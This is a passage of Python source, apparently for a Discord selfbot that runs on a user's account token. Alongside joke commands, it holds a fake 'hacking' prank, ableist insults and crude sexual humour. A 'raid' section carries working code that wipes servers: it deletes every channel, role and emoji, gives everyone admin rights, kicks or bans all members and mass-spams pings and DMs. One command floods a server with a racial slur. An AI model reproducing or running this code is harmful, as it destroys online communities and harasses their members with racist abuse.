\"Retard has no job LOL\", \"Certified discord retard\", \"Janitor\",\n        \"Police Officer\", \"Teacher\", \"Cashier\", \"Clerk\", \"Waiter\", \"Waitress\",\n        \"Grocery Bagger\", \"Retailer\", \"Sales-Person\", \"Artist\", \"Singer\",\n        \"Rapper\", \"Trapper\", \"Discord Thug\", \"Gangster\", \"Discord Packer\",\n        \"Mechanic\", \"Carpenter\", \"Electrician\", \"Lawyer\", \"Doctor\",\n        \"Programmer\", \"Software Engineer\", \"Scientist\"\n    ]\n    salary = [\n        \"Retard makes no money LOL\", \"$\" + str(random.randrange(0, 1000)),\n        '<$50,000', '<$75,000', \"$100,000\", \"$125,000\", \"$150,000\", \"$175,000\",\n        \"$200,000+\"\n    ]\n    location = [\n        \"Retard lives in his mom's basement LOL\", \"America\", \"United States\",\n        \"Europe\", \"Poland\", \"Mexico\", \"Russia\", \"Pakistan\", \"India\",\n        \"Some random third world country\", \"Canada\", \"Alabama\", \"Alaska\",\n        \"Arizona\", \"Arkansas\", \"California\", \"Colorado\", \"Connecticut\",\n        \"Delaware\", \"Florida\", \"Georgia\", \"Hawaii\", \"Idaho\", \"Illinois\",\n        \"Indiana\", \"Iowa\", \"Kansas\", \"Kentucky\", \"Louisiana\", \"Maine\",\n        \"Maryland\", \"Massachusetts\", \"Michigan\", \"Minnesota\", \"Mississippi\",\n        \"Missouri\", \"Montana\", \"Nebraska\", \"Nevada\", \"New Hampshire\",\n        \"New Jersey\", \"New Mexico\", \"New York\", \"North Carolina\",\n        \"North Dakota\", \"Ohio\", \"Oklahoma\", \"Oregon\", \"Pennsylvania\",\n        \"Rhode Island\", \"South Carolina\", \"South Dakota\", \"Tennessee\", \"Texas\",\n        \"Utah\", \"Vermont\", \"Virginia\", \"Washington\", \"West Virginia\",\n        \"Wisconsin\", \"Wyoming\"\n    ]\n    email = [\n        \"@gmail.com\", \"@yahoo.com\", \"@hotmail.com\", \"@outlook.com\",\n        \"@protonmail.com\", \"@disposablemail.com\", \"@aol.com\", \"@edu.com\",\n        \"@icloud.com\", \"@gmx.net\", \"@yandex.com\"\n    ]\n    dob = f'{random.randrange(1, 13)}/{random.randrange(1, 32)}/{random.randrange(1950, 2021)}'\n    name = [\n        'James Smith', \"Michael Smith\", \"Robert Smith\", \"Maria Garcia\",\n        \"David Smith\", \"Maria Rodriguez\", \"Mary Smith\", \"Maria Hernandez\",\n        \"Maria Martinez\", \"James Johnson\", \"Catherine Smoaks\", \"Cindi Emerick\",\n        \"Trudie Peasley\", \"Josie Dowler\", \"Jefferey Amon\", \"Kyung Kernan\",\n        \"Lola Barreiro\", \"Barabara Nuss\", \"Lien Barmore\", \"Donnell Kuhlmann\",\n        \"Geoffrey Torre\", \"Allan Craft\", \"Elvira Lucien\", \"Jeanelle Orem\",\n        \"Shantelle Lige\", \"Chassidy Reinhardt\", \"Adam Delange\", \"Anabel Rini\",\n        \"Delbert Kruse\", \"Celeste Baumeister\", \"Jon Flanary\", \"Danette Uhler\",\n        \"Xochitl Parton\", \"Derek Hetrick\", \"Chasity Hedge\",\n        \"Antonia Gonsoulin\", \"Tod Kinkead\", \"Chastity Lazar\", \"Jazmin Aumick\",\n        \"Janet Slusser\", \"Junita Cagle\", \"Stepanie Blandford\", \"Lang Schaff\",\n        \"Kaila Bier\", \"Ezra Battey\", \"Bart Maddux\", \"Shiloh Raulston\",\n        \"Carrie Kimber\", \"Zack Polite\", \"Marni Larson\", \"Justa Spear\"\n    ]\n    phone = f'({random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)})-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}-{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}{random.randrange(0, 10)}'\n    if user is None:\n        user = ctx.author\n        password = [\n            'password', '123', 'mypasswordispassword', user.name + \"iscool123\",\n            user.name + \"isdaddy\", \"daddy\" + user.name, \"ilovediscord\",\n            \"i<3discord\", \"furryporn456\", \"secret\", \"123456789\", \"apple49\",\n            \"redskins32\", \"princess\", \"dragon\", \"password1\", \"1q2w3e4r\",\n            \"ilovefurries\"\n        ]\n        message = await ctx.send(f\"`Hacking {user}...\\n`\")\n        await asyncio.sleep(1)\n        await message.edit(\n            content=f\"`Hacking {user}...\\nHacking into the mainframe...\\n`\")\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...\\nCracking SSN information...\\n`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...\\nCracking SSN information...\\nBruteforcing love life details...`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...\\nCracking SSN information...\\nBruteforcing love life details...\\nFinalizing life-span dox details\\n`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"```Successfully hacked {user}\\nName: {random.choice(name)}\\nGender: {random.choice(gender)}\\nAge: {age}\\nHeight: {random.choice(height)}\\nWeight: {weight}\\nHair Color: {random.choice(hair_color)}\\nSkin Color: {random.choice(skin_color)}\\nDOB: {dob}\\nLocation: {random.choice(location)}\\nPhone: {phone}\\nE-Mail: {user.name + random.choice(email)}\\nPasswords: {random.choices(password, k=3)}\\nOccupation: {random.choice(occupation)}\\nAnnual Salary: {random.choice(salary)}\\nEthnicity: {random.choice(ethnicity)}\\nReligion: {random.choice(religion)}\\nSexuality: {random.choice(sexuality)}\\nEducation: {random.choice(education)}```\"\n        )\n    else:\n        password = [\n            'password', '123', 'mypasswordispassword', user.name + \"iscool123\",\n            user.name + \"isdaddy\", \"daddy\" + user.name, \"ilovediscord\",\n            \"i<3discord\", \"furryporn456\", \"secret\", \"123456789\", \"apple49\",\n            \"redskins32\", \"princess\", \"dragon\", \"password1\", \"1q2w3e4r\",\n            \"ilovefurries\"\n        ]\n        message = await ctx.send(f\"`Hacking {user}...\\n`\")\n        await asyncio.sleep(1)\n        await message.edit(\n            content=f\"`Hacking {user}...\\nHacking into the mainframe...\\n`\")\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...\\nCracking SSN information...\\n`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...\\nCracking SSN information...\\nBruteforcing love life details...`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"`Hacking {user}...\\nHacking into the mainframe...\\nCaching data...\\nCracking SSN information...\\nBruteforcing love life details...\\nFinalizing life-span dox details\\n`\"\n        )\n        await asyncio.sleep(1)\n        await message.edit(\n            content=\n            f\"```Successfully hacked {user}\\nName: {random.choice(name)}\\nGender: {random.choice(gender)}\\nAge: {age}\\nHeight: {random.choice(height)}\\nWeight: {weight}\\nHair Color: {random.choice(hair_color)}\\nSkin Color: {random.choice(skin_color)}\\nDOB: {dob}\\nLocation: {random.choice(location)}\\nPhone: {phone}\\nE-Mail: {user.name + random.choice(email)}\\nPasswords: {random.choices(password, k=3)}\\nOccupation: {random.choice(occupation)}\\nAnnual Salary: {random.choice(salary)}\\nEthnicity: {random.choice(ethnicity)}\\nReligion: {random.choice(religion)}\\nSexuality: {random.choice(sexuality)}\\nEducation: {random.choice(education)}```\"\n        )\n\n\n@client.command()\nasync def tweet(ctx, username: str, *, message: str): # b'\\xfc'\n    await ctx.message.delete()\n    async with aiohttp.ClientSession() as cs:\n        async with cs.get(f\"https://nekobot.xyz/api/imagegen?type=tweet&username={username}&text={message}\") as r:\n            res = await r.json()\n            em = discord.Embed()\n            em.set_image(url=res[\"message\"])\n            await ctx.send(url=res[\"message\"])\n\n@client.command(name='8ball')\nasync def _ball(ctx, *, question): # b'\\xfc'\n    await ctx.message.delete()\n    responses = [\n      f'> **{question}**\\n> That is a resounding no',\n      f'> **{question}**\\n> It is not looking likely',\n      f'> **{question}**\\n> Too hard to tell',\n      f'> **{question}**\\n> It is quite possible',\n      f'> **{question}**\\n> That is a definite yes!',\n      f'> **{question}**\\n> Maybe',\n      f'> **{question}**\\n> There is a good chance'\n    ]\n    answer = random.choice(responses)\n    await ctx.send(answer)\n\n\n\n@client.command()\nasync def dog(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    r = requests.get(\"https://dog.ceo/api/breeds/image/random\").json()\n    em = discord.Embed()\n    em.set_image(url=str(r['message']))\n    try:\n        await ctx.send(embed=em)\n    except:\n        await ctx.send(str(r['message'])) \n\n\n\n\n\n@client.command(aliases=['dong', 'penis'])\nasync def dsize(ctx, *, user: discord.Member = None): \n    await ctx.message.delete()\n    if user is None:\n        user = ctx.author\n    size = random.randint(1, 15)\n    dong = \"\"\n    for _i in range(0, size):\n        dong += \"=\"\n    await ctx.send(f\"> {user}'s Dick size \\n> 8{dong}D\")\n    \n\n@client.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])\nasync def wyr(ctx):  \n    await ctx.message.delete()\n    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text\n    soup = bs4(r, 'html.parser')\n    qa = soup.find(id='qa').text\n    qb = soup.find(id='qb').text\n    message = await ctx.send(f\"{qa}\\nor\\n{qb}\")\n    await message.add_reaction(\"🅰\")\n    await message.add_reaction(\"🅱\")\n\n@client.command(aliases=['dvwl'])\nasync def devowel(ctx, *, text): # b'\\xfc'\n    await ctx.message.delete()\n    dvl = text.replace('a', '').replace('A', '').replace('e', '')\\\n            .replace('E', '').replace('i', '').replace('I', '')\\\n            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')\n    await ctx.send(dvl)\n\n@client.command(aliases=[\"jerkoff\", \"ejaculate\", \"orgasm\"])\nasync def cum(ctx):\n    await ctx.message.delete()\n    message = await ctx.send('''\n            :ok_hand:            :smile:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:=D \n             :trumpet:      :eggplant:''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n                      :ok_hand:            :smiley:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D \n             :trumpet:      :eggplant:  \n     ''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n                      :ok_hand:            :grimacing:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:=D \n             :trumpet:      :eggplant:  \n     ''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n                      :ok_hand:            :persevere:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D \n             :trumpet:      :eggplant:   \n     ''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n                      :ok_hand:            :confounded:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:=D \n             :trumpet:      :eggplant: \n     ''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n                       :ok_hand:            :tired_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D \n             :trumpet:      :eggplant:    \n             ''')\n    await asyncio.sleep(0.5)\n    await message.edit(contnet='''\n                       :ok_hand:            :weary:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8=:punch:= D:sweat_drops:\n             :trumpet:      :eggplant:        \n     ''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n                       :ok_hand:            :dizzy_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D :sweat_drops:\n             :trumpet:      :eggplant:                 :sweat_drops:\n     ''')\n    await asyncio.sleep(0.5)\n    await message.edit(content='''\n                       :ok_hand:            :drooling_face:\n   :eggplant: :zzz: :necktie: :eggplant: \n                   :oil:     :nose:\n                 :zap: 8==:punch:D :sweat_drops:\n             :trumpet:      :eggplant:                 :sweat_drops:\n     ''') \n\n@client.command()\nasync def minesweeper(ctx, size: int = 5): # b'\\xfc'\n    await ctx.message.delete()\n    size = max(min(size, 8), 2)\n    bombs = [[random.randint(0, size - 1), random.randint(0, size - 1)] for x in range(int(size - 1))]\n    is_on_board = lambda x, y: 0 <= x < size and 0 <= y < size\n    has_bomb = lambda x, y: [i for i in bombs if i[0] == x and i[1] == y]\n    message = \"**Minesweeper (click the tiles)**:\\n\"\n    for y in range(size):\n        for x in range(size):\n            tile = \"||{}||\".format(chr(11036))\n            if has_bomb(x, y):\n                tile = \"||{}||\".format(chr(128163))\n            else:\n                count = 0\n                for xmod, ymod in m_offets:\n                    if is_on_board(x + xmod, y + ymod) and has_bomb(x + xmod, y + ymod):\n                        count += 1\n                if count != 0:\n                    tile = \"||{}||\".format(m_numbers[count - 1])\n            message += tile\n        message += \"\\n\"\n    await ctx.send(message)\n\n\n\n\n\n\n\n\n\n#ACCOUNT\n\n@client.command()\nasync def account(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ``` Account Commands \\n> .watching (text) / displays watching thing \\n> .listening (text) / displays listening thing```')\n\n\n\n\n\n\n@client.command()\nasync def listening(ctx, *, message): # b'\\xfc'\n    await ctx.message.delete()\n    await client.change_presence(\n        activity=discord.Activity(\n            type=discord.ActivityType.listening, \n            name=message, \n        ))\n\n@client.command()\nasync def watching(ctx, *, message): # b'\\xfc'\n    await ctx.message.delete()\n    await client.change_presence(\n        activity=discord.Activity(\n            type=discord.ActivityType.watching, \n            name=message\n        ))\n\n\n#RAID\n\n@client.command()\nasync def raid(ctx):\n    await ctx.message.delete()\n    await ctx.send('> ``` Raiding Commands \\n> .orbitcrash (servername) (channel name) / crashes the discord server by deleting EVERYTHING (basicly all in 1) \\n> .deletechannels / deletes all the channels \\n> .deleteroles / deletes all the roles \\n> .deleteemjoi / deletes all the emojis \\n> .kickall / kicks everyone in the server \\n> .banall / bans everyone \\n> .channelspam (name) / spams channels (example: .channelspam hello 25) \\n> .categoryspam (name) / spams categorys \\n> .rolespam (name) / spams roles (example: .rolespam hello 200) \\n> .destroylog / destroys the log with stuff \\n> .allperms / everyone gets admin \\n> .everyonespam (text) / everyone on the server forced to type something (example: .everyonespam orbitisbest) \\n> .servername (name) / changes the server name (example: .servername Orbit) \\n> .massping / pings everyone ALOT of times (1k in under 5 seconds) \\n> .dmallf (message)  / sends everyone in that server a message \\n> .channelnuke (channel name) / deletes all the channels and creates 1 \\n> .renamechannels (text) / renames all the channels\\n> .deleteicon / delts the icon \\n> .deletebanner / deletes banner \\n> .pingspam (user) / pings the shit outa somebody \\n> .massmention / mentions everyone \\n> .massunban / unbans everyone (not tested) \\n> .webhookspam / only shows in uiversion```')\n\n\n@client.command()\nasync def orbitcrash(ctx, servername, channelname): # b'\\xfc'\n    await ctx.message.delete()\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permissons!\" + Fore.RESET)\n\n    try:\n        await ctx.guild.edit(\n            name=f\"{servername}\", \n            icon=None,\n            Banner=None,\n            )  \n    except:\n        pass   \n\n\n    \n\n    \n\n    \n\n  \n\n    for chan in ctx.guild.channels:\n        try:\n            await chan.delete()\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {chan.name} was deleted.\" + Fore.RESET)\n        except:\n            pass\n\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Deleted Icon\" + Fore.RESET) \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Deleted Banner\" + Fore.RESET) \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Changed Server Name To {Fore.WHITE}{servername}\" + Fore.RESET) \n\n    await ctx.guild.create_text_channel(name=f\"{channelname}\")\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created Channel {Fore.WHITE}{channelname}\" + Fore.RESET)\n\n    guild = ctx.guild\n    role = discord.utils.get(guild.roles, name = \"@everyone\")\n    await role.edit(permissions = Permissions.all())\n\n@client.command()\nasync def ping(ctx, *, user: discord.Member = None): # b'\\xfc'\n    await ctx.message.delete()\n    if user is None:\n        user = ctx.author      \n    dateformat = \"%a, %d %b %Y %I:%M %p\"\n    perm_string = ', '.join([str(p[0]).replace(\"_\", \" \").title() for p in user.guild_permissions if p[1]])\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n    await ctx.send(f\"<@{user.id}>\")\n\n@client.command(aliases=[\"purgebans\", \"unbanall\"])\nasync def massunban(ctx):\n    await ctx.message.delete()\n    banlist = await ctx.guild.bans()\n    for users in banlist:\n        try:\n            await asyncio.sleep(2)\n            await ctx.guild.unban(user=users.user)\n        except:\n            pass\n    \n    \n\n@client.command()\nasync def massmention(ctx, *, message=None):\n    await ctx.message.delete()\n    if len(list(ctx.guild.members)) >= 50:\n        userList = list(ctx.guild.members)\n        random.shuffle(userList)\n        sampling = random.choices(userList, k=50)\n        if message is None:\n            post_message = \"\"\n            for user in sampling:\n                post_message += user.mention\n            await ctx.send(post_message)\n        else:\n            post_message = message + \"\\n\\n\"\n            for user in sampling:\n                post_message += user.mention\n            await ctx.send(post_message)\n    else:\n        print(list(ctx.guild.members))\n        if message is None:\n            post_message = \"\"\n            for user in list(ctx.guild.members):\n                post_message += user.mention\n            await ctx.send(post_message)\n        else:\n            post_message = message + \"\\n\\n\"\n            for user in list(ctx.guild.members):\n                post_message += user.mention\n            await ctx.send(post_message)\n\n\n@client.command()\nasync def nigger(ctx): # b'\\xfc'\n\n    await ctx.message.delete()\n   \n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permissons!\" + Fore.RESET)\n\n    try:\n        await ctx.guild.edit(\n            name=f\"NIGGER\",\n            )  \n    except:\n        pass   \n\n    for _i in range(20):\n            await ctx.guild.create_text_channel(name=f\"nigger\")\n        \n        \n\n    for channel in list(ctx.guild.channels):\n        try:\n            await ctx.send(\"@everyone nigger nigger nigger\")\n            \n        except:\n         pass\n\n    \n\n    \n    \n    \n    \n\n    \n\n  \n\n    \n\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Deleted Icon\" + Fore.RESET) \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Deleted Banner\" + Fore.RESET) \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Changed Server Name To {Fore.WHITE}NIGGER\" + Fore.RESET) \n\n    for rolee in list(ctx.guild.roles):\n        try:\n            await rolee.delete()\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {rolee.name} was deleted.\" + Fore.RESET)\n        except:\n            pass\n\n    await ctx.guild.create_role(name=f\"NIGGER\")\n\n    await ctx.guild.create_text_channel(name=f\"NIGGER\")\n    await ctx.guild.create_text_channel(name=f\"NIGGER\")\n    await ctx.guild.create_text_channel(name=f\"NIGGER\")\n    await ctx.guild.create_text_channel(name=f\"NIGGER\")\n    await ctx.guild.create_text_channel(name=f\"NIGGER\")\n    await ctx.guild.create_text_channel(name=f\"NIGGER\")\n    await ctx.guild.create_text_channel(name=f\"NIGGER\")\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created Channel {Fore.WHITE}NIGGER\" + Fore.RESET)\n\n    \n\n    \n\n\n\n    \n    \n\n@client.command()\nasync def deleteicon(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permissons!\" + Fore.RESET)\n    try:\n        await ctx.guild.edit(\n            icon=None,\n            \n            \n            \n        )  \n    except:\n        pass   \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Deleted Icon\" + Fore.RESET)  \n\n\n\n@client.command()\nasync def deletebanner(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permissons!\" + Fore.RESET)\n    try:\n        await ctx.guild.edit(\n            Banner=None,\n            \n            \n            \n        )  \n    except:\n        pass   \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Deleted Banner\" + Fore.RESET)   \n   \n    \n\n@client.command()\nasync def deletechannels(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permisson to manage channels!\" + Fore.RESET)\n   \n    for channel in list(ctx.guild.channels):\n        try:\n            await channel.delete()\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {channel.name} was deleted.\" + Fore.RESET)\n            \n        except:\n            return\n\n@client.command()\nasync def renamechannels(ctx, *, text): # b'\\xfc'\n    await ctx.message.delete()\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permisson to manage channels!\" + Fore.RESET)\n   \n    for channel in list(ctx.guild.channels):\n        try:\n            await channel.edit(\n            name=f\"{text}\",)\n\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} channel renamed to {RESET}{text}\" + Fore.RESET)\n            \n        except:\n            return\n\n@client.command()\nasync def servername(ctx, *, servername): # b'\\xfc'\n    await ctx.message.delete()\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permisson to manage channels!\" + Fore.RESET)\n    try:\n        await ctx.guild.edit(\n            name=f\"{servername}\",\n            \n            \n        )  \n    except:\n        pass   \n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Changed Server Name To {Fore.WHITE}{servername}\" + Fore.RESET)     \n    \n\n@client.command()\nasync def channelnuke(ctx, *, name):\n\n    await ctx.message.delete()\n    if not ctx.author.permissions_in(ctx.channel).manage_channels:\n         print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} You dont have permisson to manage channels!\" + Fore.RESET)\n\n  \n\n    for chan in ctx.guild.channels:\n        try:\n            await chan.delete()\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {chan.name} was deleted.\" + Fore.RESET)\n        except:\n            pass\n\n    await ctx.guild.create_text_channel(name=f\"{name}\")\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created Channel {Fore.WHITE}{name}\" + Fore.RESET)\n\n@client.command()\nasync def dmall(ctx, *, message): # b'\\xfc'\n    dm_message = f\"{message}\"\n    await ctx.message.delete()\n    \n    for member in ctx.guild.members:\n        try:\n            if member.id == client.user.id:\n                pass\n            else:\n                await member.send(dm_message)\n                print(f\"Sent to {member}\")\n                # To not be rate limited\n                await asyncio.sleep(1)\n        except:\n            print(f\"Couldn't send to {member}\")\n\n@client.command(pass_context=True)\nasync def massping(ctx):\n    await ctx.message.delete()\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} type .stopmass to stop mass pinging\" + Fore.RESET)\n    global dmcssss\n    dmcssss = True\n    while dmcssss:\n        async with ctx.typing():\n             await ctx.channel.send(\"@everyone\")\n\n@client.command(pass_context=True)\nasync def massping1(ctx):\n    await ctx.message.delete()\n\n    \n    for userr in list(ctx.guild.members):\n        try:\n            await asyncio.sleep(5)    \n            await ctx.channel.send(f\"<@{userr.id}>\")\n        except:\n            pass\n\n\n    \n\n\n@client.command()\nasync def stopmass(ctx):\n\tawait ctx.message.delete()\n\tprint(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Mass Pinging Disabled\" + Fore.RESET)\n\tglobal dmcssss\n\tdmcssss = False\n    \n\n@client.command()\nasync def rolespam(ctx, name):\n    await ctx.message.delete()\n    for _i in range(250):\n            await ctx.guild.create_role(name=f\"{name}\")\n        \n\n        \n        \n        \n        \n\n@client.command()\nasync def channelspam(ctx, *, name):\n        await ctx.message.delete()\n        \n        for _i in range(20):\n            await ctx.guild.create_text_channel(name=f\"{name}\")\n        \n        print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created 20 Channel With The Name {name}\" + Fore.RESET)\n        \n@client.command()\nasync def categoryspam(ctx, name):\n        await ctx.message.delete()\n        \n        for _i in range(20):\n            await ctx.guild.create_category(name=f\"{name}\")\n        \n        print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Created 20 Categorys With The Name {name}\" + Fore.RESET)\n\n\n\n@client.command() \nasync def deleteroles(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    for role in list(ctx.guild.roles):\n        try:\n            await role.delete()\n            print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {role.name} was deleted.\" + Fore.RESET)\n        except:\n            pass\n\n@client.command()\nasync def deleteemoji(ctx):\n  await ctx.message.delete()\n    \n  for emoji in list(ctx.guild.emojis):\n     \n       await emoji.delete()\n       \n       print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} {emoji.name} was deleted.\" + Fore.RESET)\n\n@client.command()\nasync def allperms(ctx):\n    await ctx.message.delete()\n    guild = ctx.guild\n    role = discord.utils.get(guild.roles, name = \"@everyone\")\n    await role.edit(permissions = Permissions.all())\n    print(Fore.MAGENTA + f\"{RESET}[{Fore.MAGENTA}+{RESET}]{Fore.MAGENTA} Gave Every All Perms\" + Fore.RESET)\n\n@client.command()\nasync def kickall(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    for user in list(ctx.guild.members):\n        try:\n            await user.kick()\n            print(Fore.MAGENTA + f\"{ctx.guild.member.name}#{ctx.guild.member.discriminator} Was Kicked\" + Fore.RESET)\n        except:\n            pass    \n        \n\n@client.command()\nasync def banall(ctx): # b'\\xfc'\n    await ctx.message.delete()\n    for user in list(ctx.guild.members):\n        try:\n            await user.ban()\n            print(Fore.MAGENTA + f\"{ctx.guild.member.name}#{ctx.guild.member.discriminator} Was Banned\" + Fore.RESET)\n        except:\n         pass\n\n\n\n\n\nclient.run(token, bot=False)\n\n\n"
}
